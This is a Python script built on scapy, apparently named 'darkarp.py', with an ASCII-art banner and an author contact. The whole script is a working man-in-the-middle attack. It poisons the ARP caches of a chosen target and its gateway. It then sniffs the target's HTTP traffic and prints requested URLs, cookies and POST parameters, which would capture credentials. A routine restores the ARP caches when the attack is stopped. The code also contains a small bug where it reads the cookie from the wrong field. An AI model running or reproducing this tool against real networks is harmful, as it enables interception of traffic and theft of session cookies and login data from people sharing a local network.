from scapy.all import *
import argparse
import time
import sys
from scapy.layers.http import HTTPRequest

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help='-t 192.168.0.5')
parser.add_argument("-g", "--gateway", help='-g 192.168.0.1')
parser.add_argument("-i", "--interface", help='-i wlan0', default='wlp3s0')


arg = parser.parse_args()

target = arg.target
gateway = arg.gateway
interface = arg.interface

class c:
    RED = '\033[0;34m'
    GREEN = '\033[92m'
    PURPLE = '\033[0;35m'
    ENDC = '\033[0m'

print(f"\n\t⠀⠀⠀⠀⠀⣠⣴⣶⣯⠪⣕⢶⣦⣔⢄⠀⠀⠀⠀  \t\t\t{c.RED}      db      `7MMF' `YMM'`7MMF'   `7MF'{c.ENDC}")
print(f"\t⠀⠀⠀⢀⣼⣿⣿⣿⣿⣧⡙⣧⢹⣿⣷⣇⠀⠀⠀⠀  \t\t\t{c.RED}     ;MM:       MM   .M'    MM       M  {c.ENDC}")
print(f"\t⠀⠀⠀⣸⣿⣿⣿⣿⡟⠛⢿⣾⢿⡟⠟⢛⡄⠀⠀⠀  \t\t\t{c.RED}    ,V^MM.      MM .d\"      MM       M  {c.ENDC}")
print(f"\t⠀⠀⠀⣿⣿⣿⣿⢟⣯⢖⣒⣚⣭⠀⣣⣈⡨⣢⠀   \t\t\t{c.RED}   ,M  `MM      MMMMM.      MM       M  {c.ENDC}")
print(f"\t⠀⠀⠀⣿⣿⣿⢏⡛⠱⢿⣧⣿⢿⡂⠻⠭⠿⣴⠀⠀  \t\t\t{c.RED}   AbmmmqMA     MM  VMA     MM       M  {c.ENDC}")
print(f"\t⠀⠀⣰⣿⣿⡟⢼⣿⡶⡄⣴⣶⣶⠇⠀⢶⣶⡎⡗⠀  \t\t\t{c.RED}  A'     VML    MM   `MM.   YM.     ,M  {c.ENDC}")
print(f"\t⠀⢠⣿⣿⣿⢇⣷⣭⣃⠈⠙⠁⣠⢟⡟⡷⡙⢸⣷⠃  \t\t\t{c.RED}.AMA.   .AMMA..JMML.   MMb.  `bmmmmd\"'  {c.ENDC}")
print(f"\t⢀⣿⣿⠿⢟⣸⣷⠶⠯⠍⠀⡫⢬⣬⣤⣥⡅⣊⣿⣼                           ")
print(f"\t⡜⣫⣴⣿⣿⣿⠁⢰⣿⣿⣿⣿⣞⠿⢛⣵⣾⡿⠛⠁\t\t\t{c.GREEN}@akulife - raminiskandarov2004@gmail.com{c.ENDC}")
print(f"\t⠙⠿⠿⠿⣿⣿⣼⣬⣿⣿⣿⣿⣿⣷⠟⠉⠁⠀⠀⠀\n\n")

if len(sys.argv)==1: 
    parser.print_help(sys.stderr)
    sys.exit(1)
elif (gateway and target) is None:
    print(f"\t{c.GREEN}example: sudo python3 darkarp.py -t 192.168.0.5 -g 192.168.0.1 -i eth0{c.ENDC}\n")
    sys.exit(1)
def get_mac(ip):
    try:
        packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=ip)
        resp, _ = srp(packet, timeout=2, retry=3, verbose=False)
        return resp[0][1].hwsrc
    except IndexError:
        print(
            f"{c.PURPLE}[e]{c.ENDC} IP {ip} doesn't exist in local network")
        exit()


def craft_arp():

    # sending crafted arp request to the target

    arp_target = ARP()
    arp_target.op = 2
    arp_target.psrc = gateway
    arp_target.pdst = target
    arp_target.hwdst = get_mac(target)

    # sending crafted arp request to gateway

    arp_gateway = ARP()
    arp_gateway.op = 2
    arp_gateway.psrc = target
    arp_gateway.pdst = gateway
    arp_gateway.hwdst = get_mac(gateway)

    print(f"{c.GREEN}[!] ARP cache poisoning started...{c.ENDC}")

    counter = 0

    while True:
        try:
            while counter <= 1:
                print(f"[+] Sending ARP packets to {target} as a {gateway}")
                print(f"[+] Sending ARP packets to {gateway} as a {target}")
                counter = counter + 2
            send(arp_target, count=4, verbose=False)
            send(arp_gateway, count=4, verbose=False)
            time.sleep(3)
            if interface:
                sniff_packets(interface)
        except KeyboardInterrupt:
            print(f"{c.GREEN}[!] ARP attack stopped...{c.ENDC} ")
            repair_target_network()
            exit()


def sniff_packets(iface):
    sniff(filter=f"host {target}", prn=process_packet,
          iface=iface, store=False)


def process_packet(packet):
    """ 
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode(
        ) + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        cookie = packet[HTTPRequest].Cookie.decode()
        print(
            f"{c.GREEN}[+] client: {ip} server: {url} method: {method}{c.ENDC}")
        if packet.haslayer(Raw) and method == "POST":
            print(
                f"{c.RED}[/] POST:\nCookie:{packet.cookie}Parameters:\n{packet[Raw].load}{c.ENDC}")


def repair_target_network():

    # repair targets arp cache

    repair_target = ARP()
    repair_target.op = 2
    repair_target.psrc = gateway
    repair_target.hwsrc = get_mac(gateway)
    repair_target.pdst = target
    repair_target.hwdst = get_mac(target)

    # repair targets arp cache

    repair_gateway = ARP()
    repair_gateway.op = 2
    repair_gateway.psrc = target
    repair_gateway.hwsrc = get_mac(target)
    repair_gateway.pdst = gateway
    repair_gateway.hwdst = get_mac(gateway)

    print(f"{c.RED}[w]{c.ENDC} Repairing target's ARP cache")

    send(repair_target, count=5, verbose=False)

    print(f"{c.RED}[w]{c.ENDC} Repairing gateways's ARP cache")

    send(repair_gateway, count=5, verbose=False)


if __name__ == '__main__':
    craft_arp()
